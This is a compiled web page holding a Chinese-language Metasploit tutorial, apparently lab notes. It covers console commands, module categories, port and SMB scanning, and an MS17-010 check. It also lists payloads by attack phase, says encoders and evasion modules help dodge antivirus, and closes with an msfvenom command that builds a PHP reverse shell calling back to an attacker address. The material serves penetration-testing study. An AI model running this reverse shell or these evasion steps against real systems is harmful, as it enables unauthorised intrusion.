import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as n,o as e}from"./app-BvT2IhiF.js";const l={};function t(d,s){return e(),a("div",null,s[0]||(s[0]=[n(`<h2 id="基础命令" tabindex="-1"><a class="header-anchor" href="#基础命令"><span>基础命令</span></a></h2><h3 id="启动metasploit" tabindex="-1"><a class="header-anchor" href="#启动metasploit"><span>启动Metasploit</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>msfconsole</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="info" tabindex="-1"><a class="header-anchor" href="#info"><span>info</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">info</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>可以获得上下文模块信息</p><h4 id="📌-总结" tabindex="-1"><a class="header-anchor" href="#📌-总结"><span><strong>📌 总结</strong></span></a></h4><table><thead><tr><th><strong>信息类型</strong></th><th><strong>作用</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>Name/Module</strong></td><td>模块名称和路径</td><td><code>exploit/windows/smb/ms17_010_eternalblue</code></td></tr><tr><td><strong>Platform/Arch</strong></td><td>兼容性和目标环境</td><td><code>Windows x64</code></td></tr><tr><td><strong>Options</strong></td><td>必须/可选参数</td><td><code>RHOSTS</code>, <code>LHOST</code></td></tr><tr><td><strong>References</strong></td><td>漏洞技术文档</td><td><code>CVE-2017-0144</code></td></tr><tr><td><strong>Rank</strong></td><td>模块可靠性评级</td><td><code>Normal</code>, <code>Excellent</code></td></tr></tbody></table><p>通过 <code>info</code> 命令，你可以高效掌握模块的关键信息，避免盲目配置！ 🚀</p><h3 id="unset" tabindex="-1"><a class="header-anchor" href="#unset"><span>unset</span></a></h3><h4 id="基本用法" tabindex="-1"><a class="header-anchor" href="#基本用法"><span><strong>基本用法</strong></span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">unset</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">选项名</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">称&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>或取消所有选项：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">unset</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> all</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="setg" tabindex="-1"><a class="header-anchor" href="#setg"><span>setg</span></a></h3><h4 id="基本语法" tabindex="-1"><a class="header-anchor" href="#基本语法"><span>** 基本语法**</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">选项名</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">称&gt; &lt;值&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>全局设置，如果想撤销全局设置可以用unsetg</p><ul><li>setg会被模块内的set覆盖</li></ul><h3 id="search" tabindex="-1"><a class="header-anchor" href="#search"><span>search</span></a></h3><h4 id="基本语法-1" tabindex="-1"><a class="header-anchor" href="#基本语法-1"><span>** 基本语法**</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">search</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [options] &lt;keyword1&gt; [keyword2] ...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>常用选项</strong>：</p><table><thead><tr><th>选项</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>-h</code></td><td>查看帮助</td><td><code>search -h</code></td></tr><tr><td><code>type:&lt;类型&gt;</code></td><td>按模块类型过滤（<code>exploit</code>, <code>auxiliary</code>, <code>post</code>, <code>payload</code>, <code>encoder</code>, <code>nop</code>）</td><td><code>search type:exploit</code></td></tr><tr><td><code>name:&lt;名称&gt;</code></td><td>按模块名称搜索</td><td><code>search name:eternalblue</code></td></tr><tr><td><code>cve:&lt;CVE编号&gt;</code></td><td>按CVE编号搜索</td><td><code>search cve:2017-0144</code></td></tr><tr><td><code>platform:&lt;平台&gt;</code></td><td>按目标平台搜索（<code>windows</code>, <code>linux</code>, <code>android</code>）</td><td><code>search platform:windows</code></td></tr><tr><td><code>author:&lt;作者&gt;</code></td><td>按作者搜索</td><td><code>search author:hdm</code></td></tr></tbody></table><h3 id="msf模块分类" tabindex="-1"><a class="header-anchor" href="#msf模块分类"><span>msf模块分类</span></a></h3><h4 id="辅助模块" tabindex="-1"><a class="header-anchor" href="#辅助模块"><span>辅助模块</span></a></h4><p>任何支持模块，例如扫描程序、爬网程序和模糊测试程序，都可以在此处找到。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tree</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -L</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> auxiliary</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>以树状结构<br><strong>输出示例</strong>：</p><p>复制</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">auxiliary</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> admin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> analyze</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> client</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cloud</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> crawler</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> dos</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> fileformat</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> fuzzers</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gather</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> scanner</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">└──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sniffer</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>这里列出了 <code>auxiliary</code> 下所有 <strong>一级子目录</strong>（如 <code>scanner</code>、<code>dos</code>、<code>admin</code> 等），每个目录代表一类辅助模块。<br> 这是虚拟目录，不真实存在</li></ul><h3 id="编码" tabindex="-1"><a class="header-anchor" href="#编码"><span>编码</span></a></h3><p>编码器将允许您对漏洞利用和有效负载进行编码，希望基于签名的防病毒解决方案可能会错过它们。</p><h3 id="规避" tabindex="-1"><a class="header-anchor" href="#规避"><span>规避</span></a></h3><p>虽然编码器将对有效负载进行编码，但不应将其视为逃避防病毒软件的直接尝试。另一方面，“闪避”模块会尝试这一点，或多或少会成功。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tree</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -L</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> evasion/</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> evasion/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">└──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> windows</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> applocker_evasion_install_util.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> applocker_evasion_msbuild.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> applocker_evasion_presentationhost.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> applocker_evasion_regasm_regsvcs.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> applocker_evasion_workflow_compiler.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> process_herpaderping.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> syscall_inject.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> windows_defender_exe.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">└──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> windows_defender_js_hta.rb</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> directory,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> files</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h3><p>漏洞利用，按目标系统进行分类。</p><div class="language-markup line-numbers-mode" data-highlighter="shiki" data-ext="markup" data-title="markup" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/</span></span>
<span class="line"><span>exploits/</span></span>
<span class="line"><span>├── aix</span></span>
<span class="line"><span>├── android</span></span>
<span class="line"><span>├── apple_ios</span></span>
<span class="line"><span>├── bsd</span></span>
<span class="line"><span>├── bsdi</span></span>
<span class="line"><span>├── dialup</span></span>
<span class="line"><span>├── example_linux_priv_esc.rb</span></span>
<span class="line"><span>├── example.py</span></span>
<span class="line"><span>├── example.rb</span></span>
<span class="line"><span>├── example_webapp.rb</span></span>
<span class="line"><span>├── firefox</span></span>
<span class="line"><span>├── freebsd</span></span>
<span class="line"><span>├── hpux</span></span>
<span class="line"><span>├── irix</span></span>
<span class="line"><span>├── linux</span></span>
<span class="line"><span>├── mainframe</span></span>
<span class="line"><span>├── multi</span></span>
<span class="line"><span>├── netware</span></span>
<span class="line"><span>├── openbsd</span></span>
<span class="line"><span>├── osx</span></span>
<span class="line"><span>├── qnx</span></span>
<span class="line"><span>├── solaris</span></span>
<span class="line"><span>├── unix</span></span>
<span class="line"><span>└── windows</span></span>
<span class="line"><span></span></span>
<span class="line"><span>20 directories, 4 files</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="nop" tabindex="-1"><a class="header-anchor" href="#nop"><span>NOP</span></a></h3><p>NOPs （No OPeration） 从字面上看什么也不做。它们在 Intel x86 CPU 系列中具有 0x90，之后 CPU 在一个周期内将不执行任何作。它们通常用作缓冲区，以实现一致的有效载荷大小。</p><div class="language-markup line-numbers-mode" data-highlighter="shiki" data-ext="markup" data-title="markup" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/</span></span>
<span class="line"><span>nops/</span></span>
<span class="line"><span>├── aarch64</span></span>
<span class="line"><span>├── armle</span></span>
<span class="line"><span>├── cmd</span></span>
<span class="line"><span>├── mipsbe</span></span>
<span class="line"><span>├── php</span></span>
<span class="line"><span>├── ppc</span></span>
<span class="line"><span>├── sparc</span></span>
<span class="line"><span>├── tty</span></span>
<span class="line"><span>├── x64</span></span>
<span class="line"><span>└── x86</span></span>
<span class="line"><span></span></span>
<span class="line"><span>10 directories, 0 files</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="payload" tabindex="-1"><a class="header-anchor" href="#payload"><span>payload</span></a></h3><p>有效负载是将在目标系统上运行的代码。<br> 发送不同有效负载的能力，这些有效负载可以在目标系统上打开 shell。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tree</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -L</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> payloads/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">payloads/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> adapters</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> singles</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">├──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stagers</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">└──</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stages</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="📌-权限与payload选择总结" tabindex="-1"><a class="header-anchor" href="#📌-权限与payload选择总结"><span><strong>📌 权限与Payload选择总结</strong></span></a></h4><table><thead><tr><th><strong>权限阶段</strong></th><th><strong>目标</strong></th><th><strong>典型Payload</strong></th></tr></thead><tbody><tr><td><strong>初始利用</strong></td><td>获取任何执行权限</td><td><code>reverse_tcp</code>, <code>web_delivery</code></td></tr><tr><td><strong>提权</strong></td><td>升级到SYSTEM/root</td><td><code>bypassuac</code>, <code>local_exploit</code></td></tr><tr><td><strong>持久化</strong></td><td>维持长期访问</td><td><code>persistence</code>, <code>service_payload</code></td></tr><tr><td><strong>横向移动</strong></td><td>控制内网其他主机</td><td><code>psexec</code>, <code>ssh_login</code></td></tr><tr><td><strong>后渗透</strong></td><td>数据窃取/高级控制</td><td><code>meterpreter</code> + 扩展（<code>kiwi</code>, <code>mimikatz</code>）</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="post" tabindex="-1"><a class="header-anchor" href="#post"><span>POST</span></a></h3><p>Post 模块将在上面列出的渗透测试过程的最后阶段，即开发后非常有用，即搜刮财物</p><h2 id="端口扫描" tabindex="-1"><a class="header-anchor" href="#端口扫描"><span>端口扫描</span></a></h2><p>Metasploit拥有许多扫描端口的模块<br> Metasploit 具有许多模块，用于扫描目标系统和网络上的开放端口。你 可以使用命令列出可用的潜在端口扫描模块。<code>search portscan</code></p><div class="language-shell-session line-numbers-mode" data-highlighter="shiki" data-ext="shell-session" data-title="shell-session" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>msf6 &gt; search portscan</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Matching Modules</span></span>
<span class="line"><span>================</span></span>
<span class="line"><span></span></span>
<span class="line"><span>   #  Name                                              Disclosure Date  Rank    Check  Description</span></span>
<span class="line"><span>   -  ----                                              ---------------  ----    -----  -----------</span></span>
<span class="line"><span>   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator</span></span>
<span class="line"><span>   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner</span></span>
<span class="line"><span>   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner</span></span>
<span class="line"><span>   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner</span></span>
<span class="line"><span>   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner</span></span>
<span class="line"><span>   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner</span></span>
<span class="line"><span>   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP &quot;XMas&quot; Port Scanner</span></span>
<span class="line"><span>   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner</span></span>
<span class="line"><span></span></span>
<span class="line"><span>msf6 &gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>同样也可以用show option进行设置<br> 端口扫描模块将要求您设置几个选项：</p><p>端口扫描选项</p><div class="language-shell-session line-numbers-mode" data-highlighter="shiki" data-ext="shell-session" data-title="shell-session" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>msf6 auxiliary(scanner/portscan/tcp) &gt; show options</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Module options (auxiliary/scanner/portscan/tcp):</span></span>
<span class="line"><span></span></span>
<span class="line"><span>   Name         Current Setting  Required  Description</span></span>
<span class="line"><span>   ----         ---------------  --------  -----------</span></span>
<span class="line"><span>   CONCURRENCY  10               yes       The number of concurrent ports to check per host</span></span>
<span class="line"><span>   DELAY        0                yes       The delay between connections, per thread, in milliseconds</span></span>
<span class="line"><span>   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span></span>
<span class="line"><span>   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span></span>
<span class="line"><span>   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&#39;</span></span>
<span class="line"><span>   THREADS      1                yes       The number of concurrent threads (max one per host)</span></span>
<span class="line"><span>   TIMEOUT      1000             yes       The socket connect timeout in milliseconds</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>并发(<strong>CONCURRENCY</strong>)：</strong> 要同时扫描的目标数。</li><li><strong>端口(ports)：</strong> 要扫描的端口范围。请注意，这里的 1-1000 与使用 Nmap 和 default 配置。Nmap 将扫描 1000 个最常用的端口，而 Metasploit 将从 1 个开始扫描端口号 设置为 10000。</li><li>**主机(RHOSTS)：**要扫描的目标或目标网络。</li><li>**线程(THREADS)：**将同时使用的线程数。线程越多，扫描速度就越快。</li></ul><h3 id="udp扫描" tabindex="-1"><a class="header-anchor" href="#udp扫描"><span>UDP扫描</span></a></h3><p><code>scanner/discovery/udp_sweep</code>提供了快速扫描通过UDP运行的服务，这个模块不会扫描所有的UDP服务，但提供了一种快苏轼别DNS或NetBIOS等UDP服务的方法</p><h3 id="smb扫描" tabindex="-1"><a class="header-anchor" href="#smb扫描"><span>SMB扫描</span></a></h3><p>SMB1存在永恒之蓝漏洞，Metasploit提供了几个有用的辅助模块，允许我们扫描特定协议的服务例如SMB模块(<code>scanner/smb/smb_version</code>)，这在一些企业中会成为有价值的攻击目标</p><ul><li>NetBIOS服务也具有价值</li></ul><h3 id="数据库功能" tabindex="-1"><a class="header-anchor" href="#数据库功能"><span>数据库功能</span></a></h3><p>在实际渗透中可能有多个目标，为了简化操作流程，Metasploit支持用数据库对多个目标进行配置管理，先启用数据库<br><code>root@attackbox:~# systemctl start postgresql</code><br> 然后初始化Metasploit数据库</p><p>可以使用nmap数据库与其他模块进行交互</p><ol><li><p><strong>先使用 <code>db_nmap</code> 扫描网络</strong>，获取开放的 445 端口的主机信息。</p></li><li><p><strong>再使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 模块</strong>，针对开放 445 端口的主机进行 MS17-010 漏洞扫描。<br> 具体操作<br> 先用db_nmap扫描端口并输入到数据库、<br> 然后hosts -R从数据库中设置目标host</p></li></ol><p>services查看数nmap据库中的服务信息</p><p>漏洞思路</p><ul><li>HTTP：可能托管一个 Web 应用程序，您可以在其中发现 SQL 注入或远程代码执行 （RCE） 等漏洞。</li><li>FTP：可以允许匿名登录并提供对有趣文件的访问。</li><li>SMB：可能容易受到 MS17–010 等 SMB 漏洞的攻击</li><li>SSH：可能具有默认或易于猜测的凭据</li><li>RDP：如果使用了弱凭据，则可能容易受到 Bluekeep 的攻击或允许桌面访问。</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msfvenom</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> php/reverse_php</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LHOST=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">10.0.2.19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> LPORT=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">7777</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> raw</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">reverse_shell.php</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这是一个生成php反弹shell的命令</p>`,71)]))}const 